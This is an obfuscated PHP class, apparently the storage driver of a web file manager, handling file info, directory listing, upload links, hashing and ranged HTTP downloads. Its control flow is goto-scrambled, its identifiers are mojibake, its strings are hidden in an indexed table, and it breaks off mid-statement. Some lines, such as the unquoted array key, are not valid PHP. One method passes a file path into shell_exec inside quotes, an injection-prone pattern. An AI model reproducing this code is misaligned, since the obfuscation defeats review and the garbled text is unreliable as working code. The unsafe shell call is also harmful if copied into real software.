$DŸ‘¾î¾å­ = array(); if (isset($DŸ‘¾î¾å­[$fÔÍóÇË’])) { return $DŸ‘¾î¾å­[$fÔÍóÇË’]; } $DÈ‹Å‘±²¯ = $this->info($fÔÍóÇË’); if ($DÈ‹Å‘±²¯ && $DÈ‹Å‘±²¯[$CÇÖ©±—ã”[29]] == $CÇÖ©±—ã”[77]) { $EÍÊËñ’ƒ‡ = array($CÇÖ©±—ã”[78] => 0, $CÇÖ©±—ã”[79] => 0, $CÇÖ©±—ã”[80] => 0); $this->infoChildren($fÔÍóÇË’, $EÍÊËñ’ƒ‡); $DÈ‹Å‘±²¯[$CÇÖ©±—ã”[78]] = $EÍÊËñ’ƒ‡[$CÇÖ©±—ã”[78]]; $DÈ‹Å‘±²¯[$CÇÖ©±—ã”[81]] = array($CÇÖ©±—ã”[82] => $EÍÊËñ’ƒ‡[$CÇÖ©±—ã”[79]], $CÇÖ©±—ã”[83] => $EÍÊËñ’ƒ‡[$CÇÖ©±—ã”[80]]); $DŸ‘¾î¾å­[$fÔÍóÇË’] = $DÈ‹Å‘±²¯; } return $DÈ‹Å‘±²¯; } public function listPath($Eãæ–Á²à­, $f‡†õì¤Àø = false) { } public function has($bŠœ„ÍÏ¸È, $BÕ‚¯›Ö×­ = false, $FŠÎù¯…§Á = false) { } public function canRead($fÑ¯Ø„Š‚™) { } public function canWrite($b–²ÜĞÙ«) { } public function getContent($FáËíèÕÏÊ) { } public function setContent($bƒ¡‰æõáõ, $E‘µ˜±•Šë = '') { } protected function infoChildren($bÙ¬»‹²îÎ, &$EŞØ÷Êä¼) { $bšÜÕîÊ´ =& $_SERVER[«¾°Ã¤]; check_abort_echo(); $e±—ß°µƒ¿ = $this->listPath($bÙ¬»‹²îÎ, !0); $e±—ß°µƒ¿ = array_merge($e±—ß°µƒ¿[$bšÜÕîÊ´[75]], $e±—ß°µƒ¿[$bšÜÕîÊ´[74]]); foreach ($e±—ß°µƒ¿ as $cä»¦ÖÒÊ) { if ($cä»¦ÖÒÊ[$bšÜÕîÊ´[29]] == $bšÜÕîÊ´[77]) { $EŞØ÷Êä¼[$bšÜÕîÊ´[80]]++; $bá‰Ï†íªŒ = $this->getPathInner($cä»¦ÖÒÊ[$bšÜÕîÊ´[76]]); $this->infoChildren($bá‰Ï†íªŒ, $EŞØ÷Êä¼); } else { $EŞØ÷Êä¼[$bšÜÕîÊ´[79]]++; $EŞØ÷Êä¼[$bšÜÕîÊ´[78]] += $cä»¦ÖÒÊ[$bšÜÕîÊ´[78]]; } } } public function fileSubstr($Cñ¤¡‹÷‘¬, $bÀ›ä›­‹›, $A¨ä´®âŸö) { } public function listAll($FäÙÚÙ‡õİ) { } public function listAllMake($f³“Ñ•š¼Î, &$f¸ã„¿­ùí) { $fã¬„©± =& $_SERVER[«¾°Ã¤]; check_abort_echo(); $eã¡¡é¾Ûã = $this->listPath($f³“Ñ•š¼Î, !0); if (!$eã¡¡é¾Ûã) { return; } $CÄô¸Ş§¡ = array_merge($eã¡¡é¾Ûã[$fã¬„©±[75]], $eã¡¡é¾Ûã[$fã¬„©±[74]]); foreach ($CÄô¸Ş§¡ as $c†ì¯²„¢î) { goto Cƒºß¶¾‚‚; D¸äªÑ”‡: $this->listAllMake($c†ì¯²„¢î[$fã¬„©±[76]], $f¸ã„¿­ùí); goto d±îæó¼; Cƒºß¶¾‚‚: $E·’£ŒÕçë = $c†ì¯²„¢î[$fã¬„©±[29]] == $fã¬„©±[77]; $EŠ‰•™ŸÈß = array($fã¬„©±[76] => $c†ì¯²„¢î[$fã¬„©±[76]], $fã¬„©±[77] => $E·’£ŒÕçë); if (isset($c†ì¯²„¢î[$fã¬„©±[78]])) { $EŠ‰•™ŸÈß[$fã¬„©±[78]] = $c†ì¯²„¢î[$fã¬„©±[78]]; } goto CÄÎ…£“”È; CÄÎ…£“”È: if (isset($c†ì¯²„¢î[$fã¬„©±[84]])) { $EŠ‰•™ŸÈß[$fã¬„©±[84]] = $c†ì¯²„¢î[$fã¬„©±[84]]; } if (!$E·’£ŒÕçë) { $f¸ã„¿­ùí[] = $EŠ‰•™ŸÈß; continue; } $f¸ã„¿­ùí[] = $EŠ‰•™ŸÈß; goto D¸äªÑ”‡; d±îæó¼: } } public function listAllSimple($BØç–‰Ø‘ƒ) { $c¯—óÉßù =& $_SERVER[«¾°Ã¤]; $AÅ†ÈÔ¥ä = array(); $F¹‚õ˜”ä = $this->listAll($BØç–‰Ø‘ƒ); $e¦áá×‰¤ = $this->getPathOuter($BØç–‰Ø‘ƒ); foreach ($F¹‚õ˜”ä as $EçäÔà‰°Î) { goto a… µÂ÷¥˜; a… µÂ÷¥˜: $FÓ£Æ…âä– = $EçäÔà‰°Î[$c¯—óÉßù[76]]; $DÀœ§ìäÛ™ = $EçäÔà‰°Î[$c¯—óÉßù[76]]; if (isset($EçäÔà‰°Î[$c¯—óÉßù[85]])) { $FÓ£Æ…âä– = $EçäÔà‰°Î[$c¯—óÉßù[85]][$c¯—óÉßù[76]]; $EçäÔà‰°Î[$c¯—óÉßù[78]] = $EçäÔà‰°Î[$c¯—óÉßù[85]][$c¯—óÉßù[78]]; $EçäÔà‰°Î[$c¯—óÉßù[84]] = $EçäÔà‰°Î[$c¯—óÉßù[85]][$c¯—óÉßù[84]]; } else { $DÀœ§ìäÛ™ = substr($EçäÔà‰°Î[$c¯—óÉßù[76]], strlen(get_path_father($e¦áá×‰¤))); $DÀœ§ìäÛ™ = $c¯—óÉßù[8] . ltrim($DÀœ§ìäÛ™, $c¯—óÉßù[8]); } goto CÓ²Ÿ´‰¯ ; CÓ²Ÿ´‰¯ : $Fß¸İ§â¤´ = array($c¯—óÉßù[76] => $DÀœ§ìäÛ™, $c¯—óÉßù[77] => $EçäÔà‰°Î[$c¯—óÉßù[77]]); if (isset($EçäÔà‰°Î[$c¯—óÉßù[78]]) && !$EçäÔà‰°Î[$c¯—óÉßù[77]]) { $Fß¸İ§â¤´[$c¯—óÉßù[78]] = $EçäÔà‰°Î[$c¯—óÉßù[78]]; } if (isset($EçäÔà‰°Î[$c¯—óÉßù[84]])) { $Fß¸İ§â¤´[$c¯—óÉßù[84]] = $EçäÔà‰°Î[$c¯—óÉßù[84]]; } goto f‰øÁùÀ†Ÿ; f‰øÁùÀ†Ÿ: if (!$EçäÔà‰°Î[$c¯—óÉßù[77]]) { $Fß¸İ§â¤´[$c¯—óÉßù[86]] = $FÓ£Æ…âä–; } $AÅ†ÈÔ¥ä[] = $Fß¸İ§â¤´; goto C¬¨™ì¤ëõ; C¬¨™ì¤ëõ: } return $AÅ†ÈÔ¥ä; } public function upload($e‹ÈËÁ—ê, $FñùóÙî‹, $dğĞ§ÊÛ­À = false, $B—Æ‹§°Í¹ = REPEAT_REPLACE) { } public function uploadFileByID($Aí•Šíò²ö, $DÊá¡‹„ÚÇ, $cÍöã‚ëÇÇ) { } public function uploadFileByPath($F¹œÙõ§˜, $CÅé¼¿ø”¦, $E„ªŠİÒÏŒ = array()) { } public function isUploadServer() { $B²•Â†¯… =& $_SERVER[«¾°Ã¤]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $B²•Â†¯…[87]) { return !0; } return $GLOBALS[$B²•Â†¯…[6]][$B²•Â†¯…[88]][$B²•Â†¯…[89]]; } public function isFileOutServer() { $EÎŸÌ‹’÷æ =& $_SERVER[«¾°Ã¤]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $EÎŸÌ‹’÷æ[87]) { return !0; } return $GLOBALS[$EÎŸÌ‹’÷æ[6]][$EÎŸÌ‹’÷æ[88]][$EÎŸÌ‹’÷æ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fí·ãÈÌÀè) { $D´éˆ¹©íÅ =& $_SERVER[«¾°Ã¤]; if (!$this->isCdnHost()) { return $fí·ãÈÌÀè; } return str_replace(trim(get_url_root($fí·ãÈÌÀè), $D´éˆ¹©íÅ[8]), trim($this->cdnHost, $D´éˆ¹©íÅ[8]), $fí·ãÈÌÀè); } public function uploadLink($cõãåä–, $fÀÅ”Õ²Š = 0) { goto DÚÍ¡¡äˆ; bª°ğŒ¤“º: if ($CÇŸ—èÇŸë) { $CÇŸ—èÇŸë[$f¹æ˜ìŒ­ï[93]] = $cõãåä–; $CÇŸ—èÇŸë[$f¹æ˜ìŒ­ï[94]] = $cÈÅËÇ½Í¤; } return $CÇŸ—èÇŸë; goto f¶“œ¸£®±; BäÄ¶â×Ê„: $b¢´Ë›¥ô¹ = $fÀÅ”Õ²Š <= $D•Üùœ¼š¼ ? $f¹æ˜ìŒ­ï[91] : $f¹æ˜ìŒ­ï[92]; $bÄêÃ°×ÜÅ = (!$fÀÅ”Õ²Š ? 1 : ceil($fÀÅ”Õ²Š / pow(1024, 3))) * 3600 * 4; $CÇŸ—èÇŸë = $this->{$b¢´Ë›¥ô¹}($cõãåä–, $bÄêÃ°×ÜÅ); goto bª°ğŒ¤“º; DÚÍ¡¡äˆ: $f¹æ˜ìŒ­ï =& $_SERVER[«¾°Ã¤]; if ($this->isUploadServer()) { return; } $cÈÅËÇ½Í¤ = $this->getType(); goto E¶†éÇôñè; E¶†éÇôñè: if (!in_array($cÈÅËÇ½Í¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $D•Üùœ¼š¼ = 1024 * 1024 * 10; goto BäÄ¶â×Ê„; f¶“œ¸£®±: } public function uploadFormData($BÀ¢÷š–Ş, $AÜ«Ò …îÔ = 3600) { } public function multiUploadFormData($D¸ºÛ·„É, $eõáˆ”¶ = 3600) { } public function download($E¯ö×ôàêÜ, $f³ì™ášÊ) { } public function ext($EâÅƒ‚³½¢) { $Dƒ–‹Í²†á =& $_SERVER[«¾°Ã¤]; if (strpos($EâÅƒ‚³½¢, $Dƒ–‹Í²†á[8]) === -1) { $eõ—±Ğ˜µ = $EâÅƒ‚³½¢; } else { $eõ—±Ğ˜µ = $this->pathThis($EâÅƒ‚³½¢); } $D¬–±ò = $Dƒ–‹Í²†á[33]; if (strstr($eõ—±Ğ˜µ, $Dƒ–‹Í²†á[95])) { $D¬–±ò = substr($eõ—±Ğ˜µ, strrpos($eõ—±Ğ˜µ, $Dƒ–‹Í²†á[95]) + 1); $D¬–±ò = strtolower($D¬–±ò); } if (strlen($D¬–±ò) > 3 && preg_match($Dƒ–‹Í²†á[96], $D¬–±ò, $B¸Èğ‡‘¹)) { $D¬–±ò = $Dƒ–‹Í²†á[33]; } return $D¬–±ò; } public function pathThis($D÷à½Ü–ÕŞ) { $cÕ›ôÏ×µ¸ =& $_SERVER[«¾°Ã¤]; $D÷à½Ü–ÕŞ = str_replace($cÕ›ôÏ×µ¸[97], $cÕ›ôÏ×µ¸[8], rtrim($D÷à½Ü–ÕŞ, $cÕ›ôÏ×µ¸[8])); $E·ßê÷„¾¥ = strrpos($D÷à½Ü–ÕŞ, $cÕ›ôÏ×µ¸[8]); if ($E·ßê÷„¾¥ === !1) { return $D÷à½Ü–ÕŞ; } return substr($D÷à½Ü–ÕŞ, $E·ßê÷„¾¥ + 1); } public function pathFather($DâÂñ´‹™) { $cù›Ÿ–Ñƒ =& $_SERVER[«¾°Ã¤]; $DâÂñ´‹™ = str_replace($cù›Ÿ–Ñƒ[97], $cù›Ÿ–Ñƒ[8], rtrim($DâÂñ´‹™, $cù›Ÿ–Ñƒ[8])); $D÷‘ñ›Ö££ = strrpos($DâÂñ´‹™, $cù›Ÿ–Ñƒ[8]); if ($D÷‘ñ›Ö££ === !1) { return $cù›Ÿ–Ñƒ[33]; } return substr($DâÂñ´‹™, 0, $D÷‘ñ›Ö££ + 1); } public function hashSimple($f“ ’îí©³) { goto Eİß—…½Š‹; aé˜“ñÓî„: $fÌ¡ÕªÀß .= $this->fileSubstr($f“ ’îí©³, $B¼¨ëÇì®‚ - $eŒâËù¥‡õ, $eŒâËù¥‡õ); return md5($fÌ¡ÕªÀß) . $B¼¨ëÇì®‚; goto bÀˆôãªã«; Eİß—…½Š‹: $d‚êßªÔ„ =& $_SERVER[«¾°Ã¤]; if (!$f“ ’îí©³) { return md5($d‚êßªÔ„[33]); } $B¼¨ëÇì®‚ = $this->size($f“ ’îí©³); goto FÀŒÔö§Ì; B®ˆ‹Ô¿Ú‹: $D» ”¯÷«¶ = intval($B¼¨ëÇì®‚ / $BÊÔ»ßÜÂ); $fÌ¡ÕªÀß = $d‚êßªÔ„[33]; for ($AØ£ÁŠù‚¥ = 0; $AØ£ÁŠù‚¥ < $BÊÔ»ßÜÂ; $AØ£ÁŠù‚¥++) { $fÌ¡ÕªÀß .= $this->fileSubstr($f“ ’îí©³, $D» ”¯÷«¶ * $AØ£ÁŠù‚¥, $eŒâËù¥‡õ); } goto aé˜“ñÓî„; FÀŒÔö§Ì: $eŒâËù¥‡õ = 200; $BÊÔ»ßÜÂ = 50; if ($B¼¨ëÇì®‚ <= $eŒâËù¥‡õ * $BÊÔ»ßÜÂ) { return $this->hashMd5($f“ ’îí©³) . $B¼¨ëÇì®‚; } goto B®ˆ‹Ô¿Ú‹; bÀˆôãªã«: } public static $md5Cache = array(); public function hashMd5($Eß•÷Šƒ‡·) { $Eß•÷Šƒ‡· = $this->iconvSystem($Eß•÷Šƒ‡·); if (isset(self::$md5Cache[$Eß•÷Šƒ‡·])) { return self::$md5Cache[$Eß•÷Šƒ‡·]; } self::$md5Cache[$Eß•÷Šƒ‡·] = $this->hashMd5Shell($Eß•÷Šƒ‡·); if (!self::$md5Cache[$Eß•÷Šƒ‡·]) { self::$md5Cache[$Eß•÷Šƒ‡·] = @md5_file($Eß•÷Šƒ‡·); } return self::$md5Cache[$Eß•÷Šƒ‡·]; } private function hashMd5Shell($bÍ®Î³¡æ) { goto f«ÀŒÄ•¢é; EĞØñƒÖäÄ: $Cø¼Ş¦ŒÖ = shell_exec($a±¾Ì­¯È‘ . "\x20\42{$bÍ®Î³¡æ}\x22"); $Cø¼Ş¦ŒÖ = str_replace($D¥æˆö¡ñó[104], $D¥æˆö¡ñó[33], $Cø¼Ş¦ŒÖ); return substr($Cø¼Ş¦ŒÖ, 0, 32); goto fÓº±Äñµã; f«ÀŒÄ•¢é: $D¥æˆö¡ñó =& $_SERVER[«¾°Ã¤]; if (!function_exists($D¥æˆö¡ñó[98])) { return !1; } $BßÂîóìª = array($D¥æˆö¡ñó[99], $D¥æˆö¡ñó[100]); goto a®µÊ´ƒèÒ; a®µÊ´ƒèÒ: $a±¾Ì­¯È‘ = Cache::get($D¥æˆö¡ñó[101]); if (!$a±¾Ì­¯È‘) { $f²•¶•†ÓÛ = BASIC_PATH . $D¥æˆö¡ñó[102]; $d¡³†æˆ¾Ô = md5_file($f²•¶•†ÓÛ); $a±¾Ì­¯È‘ = $D¥æˆö¡ñó[103]; foreach ($BßÂîóìª as $d™—‰æ³ò½) { $Cø¼Ş¦ŒÖ = shell_exec($d™—‰æ³ò½ . "\40\x22{$f²•¶•†ÓÛ}\x22"); if ($Cø¼Ş¦ŒÖ && substr(trim($Cø¼Ş¦ŒÖ), 0, 32) == $d¡³†æˆ¾Ô) { $a±¾Ì­¯È‘ = $d™—‰æ³ò½; break; } } Cache::set($D¥æˆö¡ñó[101], $a±¾Ì­¯È‘, 3600); } if ($a±¾Ì­¯È‘ == $D¥æˆö¡ñó[103]) { return !1; } goto EĞØñƒÖäÄ; fÓº±Äñµã: } public function link($B‹×„¢Şì) { return $B‹×„¢Şì; } public function fileOut($f‚¼Ú¥›Üã, $còÇÚˆÚ‰Õ = false, $e÷‹Œ¿–Ç = false, $DôøÙºïÊÌ = '') { goto bÚöòé©Æ; D×ªºå¯³Ñ: header($a“ëîÉ ²¸[120]); header($a“ëîÉ ²¸[121] . $a´’÷³©); $FÅåÆ­Úâ† = rawurlencode($f»Á»Ç”éÖ); goto A¼™Œò´›˜; eñ·âÙ°Î: if ($d’ÑšÍ¬) { $bÈœÀ—†èĞ = intval(1000 * 1000 * ($eñô¼‡˜¡å / $d’ÑšÍ¬)); } while ($d¥ìï÷š¦‰ <= $FÓ±È‰ùÈ) { $cªˆÂ‘–¤ = timeFloat(); check_abort(); $dÓÌÙ„·©ï = $FÓ±È‰ùÈ - $d¥ìï÷š¦‰ + 1; if ($dÓÌÙ„·©ï <= $eñô¼‡˜¡å) { $eñô¼‡˜¡å = $dÓÌÙ„·©ï; } echo $this->fileSubstr($f‚¼Ú¥›Üã, $d¥ìï÷š¦‰, $eñô¼‡˜¡å); $d¥ìï÷š¦‰ += $eñô¼‡˜¡å; if ($eñô¼‡˜¡å == $dÓÌÙ„·©ï) { $d¥ìï÷š¦‰ = $FÓ±È‰ùÈ + 1; } if ($bÈœÀ—†èĞ) { $EÛùÃˆÈ = intval(1000 * 1000 * (timeFloat() - $cªˆÂ‘–¤)); $b£æã‹Ëë‘ = $bÈœÀ—†èĞ - $EÛùÃˆÈ; if ($b£æã‹Ëë‘ > 5) { usleep($b£æã‹Ëë‘); } } } goto Dƒ·Ã§ˆ; dŠÃµâ‘Ì±: header($a“ëîÉ ²¸[135] . $eÙ¬”Ùä½ . $a“ëîÉ ²¸[127]); header($a“ëîÉ ²¸[136] . $f»Á»Ç”éÖ); header($a“ëîÉ ²¸[137]); goto CøÒ”è˜Íè; bÚöòé©Æ: $a“ëîÉ ²¸ =& $_SERVER[«¾°Ã¤]; $this->cacheMethod(null, null); if (!$f‚¼Ú¥›Üã || !$this->exist($f‚¼Ú¥›Üã)) { show_json(LNG($a“ëîÉ ²¸[105]), !1, $e÷‹Œ¿–Ç); } goto DÃŠßË‹ø; a¤Ø ËÓ‘: $EÃ­Ì¿ä… = $Aã³Œ£î†Ê[$a“ëîÉ ²¸[78]]; $eÙ¬”Ùä½ = gmdate($a“ëîÉ ²¸[110], $Aã³Œ£î†Ê[$a“ëîÉ ²¸[84]]); $f»Á»Ç”éÖ = $e÷‹Œ¿–Ç ? $e÷‹Œ¿–Ç : $this->iconvApp($Aã³Œ£î†Ê[$a“ëîÉ ²¸[28]]); goto bŸ†›Çæ; A¼™Œò´›˜: $FÅåÆ­Úâ† = $a“ëîÉ ²¸[116] . $FÅåÆ­Úâ† . $a“ëîÉ ²¸[122] . $FÅåÆ­Úâ†; if ($còÇÚˆÚ‰Õ) { header($a“ëîÉ ²¸[123]); header($a“ëîÉ ²¸[124] . $FÅåÆ­Úâ†); } else { header($a“ëîÉ ²¸[125] . $FÅåÆ­Úâ†); } header($a“ëîÉ ²¸[126] . gmdate($a“ëîÉ ²¸[110], time() + 3600 * 24 * 30) . $a“ëîÉ ²¸[127]); goto FÓæŒõø­Î; e‹¶¥•ë“Ã: if (in_array($FÊ¦¨µÀâ‡, array($a“ëîÉ ²¸[111], $a“ëîÉ ²¸[112], $a“ëîÉ ²¸[113], $a“ëîÉ ²¸[114]))) { $FÊ¦¨µÀâ‡ = $a“ëîÉ ²¸[115]; } if (!$DôøÙºïÊÌ) { $DôøÙºïÊÌ = md5($eÙ¬”Ùä½ . $this->hashSimple($f‚¼Ú¥›Üã)); } $DôøÙºïÊÌ = $a“ëîÉ ²¸[116] . $DôøÙºïÊÌ . $a“ëîÉ ²¸[116]; goto EáÊ…õá¾÷; dÓ¡ğºŸ‚: if ($_SERVER[$a“ëîÉ ²¸[157]] == $a“ëîÉ ²¸[158]) { return; } $eñô¼‡˜¡å = 1024 * 100; $bÈœÀ—†èĞ = 0; goto eñ·âÙ°Î; cÜ„†¬ãÓÙ: if (isset($_SERVER[$a“ëîÉ ²¸[131]]) && strtotime($_SERVER[$a“ëîÉ ²¸[131]]) == $Aã³Œ£î†Ê[$a“ëîÉ ²¸[84]]) { header($a“ëîÉ ²¸[132], !0, 304); die; } if (isset($_SERVER[$a“ëîÉ ²¸[133]]) && $_SERVER[$a“ëîÉ ²¸[133]] == $DôøÙºïÊÌ) { header($a“ëîÉ ²¸[134] . $DôøÙºïÊÌ, !0, 304); die; } header($a“ëîÉ ²¸[134] . $DôøÙºïÊÌ); goto dŠÃµâ‘Ì±; DÃŠßË‹ø: $B×œèŠ´² = $this->getType() == $a“ëîÉ ²¸[106]; $e„”ğÑ†ÉÏ = $GLOBALS[$a“ëîÉ ²¸[6]][$a“ëîÉ ²¸[88]][$a“ëîÉ ²¸[107]][$a“ëîÉ ²¸[108]]; $d’ÑšÍ¬ = (double) $GLOBALS[$a“ëîÉ ²¸[6]][$a“ëîÉ ²¸[88]][$a“ëîÉ ²¸[107]][$a“ëîÉ ²¸[109]] * 1024 * 1024; goto c¨‚óô³µö; d õÔ†Æ¢î: $B©ÑÕ½Ó×­ = !0; if ($_SERVER[$a“ëîÉ ²¸[154]] == $a“ëîÉ ²¸[155] && $EÃ­Ì¿ä… > 1204 * 1024 * 1024 * 2) { $B©ÑÕ½Ó×­ = !1; } if ($B©ÑÕ½Ó×­) { header($a“ëîÉ ²¸[156] . ($FÓ±È‰ùÈ - $d¥ìï÷š¦‰ + 1)); } goto dÓ¡ğºŸ‚; CøÒ”è˜Íè: header($a“ëîÉ ²¸[138] . $EÃ­Ì¿ä…); header($a“ëîÉ ²¸[139]); if (!$còÇÚˆÚ‰Õ && $FÊ¦¨µÀâ‡ == $a“ëîÉ ²¸[140]) { if ($EÃ­Ì¿ä… > 1024 * 1024 * 5) { die; } $B¹Ôâ‹ŠÊÍ = $this->getContent($f‚¼Ú¥›Üã); $B¹Ôâ‹ŠÊÍ = Html::clearSVG($B¹Ôâ‹ŠÊÍ); header($a“ëîÉ ²¸[141] . strlen($B¹Ôâ‹ŠÊÍ)); echo $B¹Ôâ‹ŠÊÍ; die; } goto aº½ÁÌ¹›; FÓæŒõø­Î: header($a“ëîÉ ²¸[128]); header($a“ëîÉ ²¸[129]); header($a“ëîÉ ²¸[130]); goto cÜ„†¬ãÓÙ; bŸ†›Çæ: $d¥ìï÷š¦‰ = 0; $FÓ±È‰ùÈ = $EÃ­Ì¿ä… - 1; $FÊ¦¨µÀâ‡ = $this->ext($f»Á»Ç”éÖ); goto e‹¶¥•ë“Ã; EáÊ…õá¾÷: $a´’÷³© = get_file_mime($FÊ¦¨µÀâ‡); if (strstr($a´’÷³©, $a“ëîÉ ²¸[117])) { $a´’÷³© = $a´’÷³© . $a“ëîÉ ²¸[118]; } if ($còÇÚˆÚ‰Õ === !1 && !mime_support($a´’÷³©)) { $còÇÚˆÚ‰Õ = !0; $a´’÷³© = $a“ëîÉ ²¸[119]; } goto D×ªºå¯³Ñ; aº½ÁÌ¹›: $C© ‡ë™ƒ = strtolower($_SERVER[$a“ëîÉ ²¸[142]]); if ($B×œèŠ´² && $C© ‡ë™ƒ && $e„”ğÑ†ÉÏ) { if (strstr($C© ‡ë™ƒ, $a“ëîÉ ²¸[143])) { header($a“ëîÉ ²¸[144] . $f‚¼Ú¥›Üã); } else { if (strstr($C© ‡ë™ƒ, $a“ëîÉ ²¸[145])) { header($a“ëîÉ ²¸[146] . $f‚¼Ú¥›Üã); } else { if (strstr($C© ‡ë™ƒ, $a“ëîÉ ²¸[147])) { header($a“ëîÉ ²¸[148] . $f‚¼Ú¥›Üã); } } } if ($d’ÑšÍ¬) { header($a“ëîÉ ²¸[149] . $d’ÑšÍ¬); } return; } if (isset($_SERVER[$a“ëîÉ ²¸[150]])) { if (preg_match($a“ëîÉ ²¸[151], $_SERVER[$a“ëîÉ ²¸[150]], $a¸›‚…Ü„¼)) { $d¥ìï÷š¦‰ = intval($a¸›‚…Ü„¼[1]); if (!empty($a¸›‚…Ü„¼[2])) { $FÓ±È‰ùÈ = intval($a¸›‚…Ü„¼[2]); } } header($a“ëîÉ ²¸[152]); header("\x43\157\156\164\x65\x6e\164\55\122\141\x6e\x67\145\x3a\x20\142\x79\x74\x65\x73\40{$d¥ìï÷š¦‰}\x2d{$FÓ±È‰ùÈ}\x2f" . $EÃ­Ì¿ä…); } else { header($a“ëîÉ ²¸[153]); } goto d õÔ†Æ¢î; c¨‚óô³µö: @ob_end_clean(); set_timeout(); $Aã³Œ£î†Ê = $this->infoFull($f‚¼Ú¥›Üã); goto a¤Ø ËÓ‘; Dƒ·Ã§ˆ: } public function fileOutServer($dÉöæƒØç, $Dõ¢ÛªéËã = false, $dóà½Àøè = false, $Aò¼ÑÜ‹ ƒ = '') { $this->fileOut($dÉöæƒØç, $Dõ¢ÛªéËã, $dóà½Àøè, $Aò¼ÑÜ‹ ƒ); } public function fileOutLink($dñ·†–¸ê ) { header($_SERVER[«¾°Ã¤][159] . $dñ·†–¸ê ); die; } public function cacheMethod($EÕã§½Šà, $c˜ª•ôÇÊ…, $dèŠñÅ·Ğˆ = null) { goto dÎÒÚ–£î÷; A”Îéêˆ˜Ÿ: $AÚ»éŸŞĞ = $this->{$EÕã§½Šà}($c˜ª•ôÇÊ…); $bÃˆœïõ•©[$eº„çÔ»¾ñ] = $AÚ»éŸŞĞ; return $AÚ»éŸŞĞ; goto AÙÉ‡”§¶Ä; Aº˜—ôõ…Ï: $eº„çÔ»¾ñ = $DĞ—“ ÕÙè[160] . $EÕã§½Šà . $DĞ—“ ÕÙè[161] . rtrim($B«óÅØÙ¿Ú, $DĞ—“ ÕÙè[8]); if (is_null($EÕã§½Šà)) { $bÃˆœïõ•© = array(); return; } if (is_null($c˜ª•ôÇÊ…)) { unset($bÃˆœïõ•©[$eº„çÔ»¾ñ]); return; } goto f¸®ŒŸî ×; dÎÒÚ–£î÷: $DĞ—“ ÕÙè =& $_SERVER[«¾°Ã¤]; static $bÃˆœïõ•© = array(); $B«óÅØÙ¿Ú = $c˜ª•ôÇÊ… ? ltrim($this->getPathOuter($c˜ª•ôÇÊ…), $DĞ—“ ÕÙè[8]) : $c˜ª•ôÇÊ…; goto Aº˜—ôõ…Ï; f¸®ŒŸî ×: if (!is_null($dèŠñÅ·Ğˆ)) { $bÃˆœïõ•©[$eº„çÔ»¾ñ] = $dèŠñÅ·Ğˆ; return; } $AÚ»éŸŞĞ = isset($bÃˆœïõ•©[$eº„çÔ»¾ñ]) ? $bÃˆœïõ•©[$eº„çÔ»¾ñ] : null; if (!is_null($AÚ»éŸŞĞ)) { return $AÚ»éŸŞĞ; } goto A”Îéêˆ˜Ÿ; AÙÉ‡”§¶Ä: } public function fileOutImage($cÈ¼¨ªßôµ, $A…ÂÒòÆÅ× = 250) { goto BÁ¦»ÁÓ; Fº«İ«Ì®¬: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $fÉŠ£Ëƒ„ = DATA_THUMB . $fŠ¸°‘Éˆ†; del_file($fÉŠ£Ëƒ„); goto FÙ—Ëö‡Ñ‡; FÙ—Ëö‡Ñ‡: if (!@file_exists($fÉŠ£Ëƒ„)) { $fŒîßø¼…ˆ = TEMP_FILES; if (!is_dir($fŒîßø¼…ˆ)) { mk_dir($fŒîßø¼…ˆ); } $EÄĞŠ¤®òó = $fŒîßø¼…ˆ . $a¿ÎÖ¼“¨º . $Eğå…•«ïÃ[95] . $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[168]]; if (!@file_exists($EÄĞŠ¤®òó)) { $EÄĞŠ¤®òó = $this->download($cÈ¼¨ªßôµ, $EÄĞŠ¤®òó); } ImageThumb::createThumb($EÄĞŠ¤®òó, $fÉŠ£Ëƒ„, $A…ÂÒòÆÅ×, $A…ÂÒòÆÅ× * 10); } if (!file_exists($fÉŠ£Ëƒ„) || filesize($fÉŠ£Ëƒ„) < 100) { return @file_exists($EÄĞŠ¤®òó) ? IO::fileOut($EÄĞŠ¤®òó) : $this->fileOut($cÈ¼¨ªßôµ); } if (!($c±Ö¦ğ“§Ü = IO::move($fÉŠ£Ëƒ„, $C³àêâÔ”œ))) { return IO::fileOut($fÉŠ£Ëƒ„); } goto fßÏ‡†º; eêêÉİµª: if (isset($GLOBALS[$Eğå…•«ïÃ[162]]) && $GLOBALS[$Eğå…•«ïÃ[162]][$Eğå…•«ïÃ[76]] == $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[76]]) { $Fä¿ŠÒâŸ˜ = $GLOBALS[$Eğå…•«ïÃ[162]][$Eğå…•«ïÃ[163]]; if (!$c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]]) { $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]] = $GLOBALS[$Eğå…•«ïÃ[162]]; } if (isset($Fä¿ŠÒâŸ˜[$Eğå…•«ïÃ[165]])) { if ($Fä¿ŠÒâŸ˜[$Eğå…•«ïÃ[165]] <= $A…ÂÒòÆÅ× && $Fä¿ŠÒâŸ˜[$Eğå…•«ïÃ[166]] <= $A…ÂÒòÆÅ×) { $a”™–¦’Î = !0; } } $AÄŠ˜ğâ = $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]][$Eğå…•«ïÃ[28]]; } if ($c•Ø‘ÀíÒá[$Eğå…•«ïÃ[78]] <= 1024 * 50 || $a”™–¦’Î || !function_exists($Eğå…•«ïÃ[167]) || $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[168]] == $Eğå…•«ïÃ[169]) { return $this->fileOut($cÈ¼¨ªßôµ, !1, $AÄŠ˜ğâ); } if (isset($c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]][$Eğå…•«ïÃ[170]])) { $a¿ÎÖ¼“¨º = $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]][$Eğå…•«ïÃ[170]]; } else { if (isset($c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]][$Eğå…•«ïÃ[171]])) { $a¿ÎÖ¼“¨º = $c•Ø‘ÀíÒá[$Eğå…•«ïÃ[164]][$Eğå…•«ïÃ[171]]; } else { $a¿ÎÖ¼“¨º = 